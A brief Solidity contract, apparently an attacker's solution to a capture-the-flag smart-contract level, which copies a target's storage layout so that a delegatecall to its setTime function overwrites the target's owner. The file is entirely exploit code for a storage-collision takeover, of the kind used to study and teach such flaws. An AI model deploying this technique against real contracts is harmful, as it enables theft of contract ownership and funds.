// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationHack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        // forge-lint: disable-next-line(unsafe-typecast)
        owner = address(uint160(_time));
    }
}
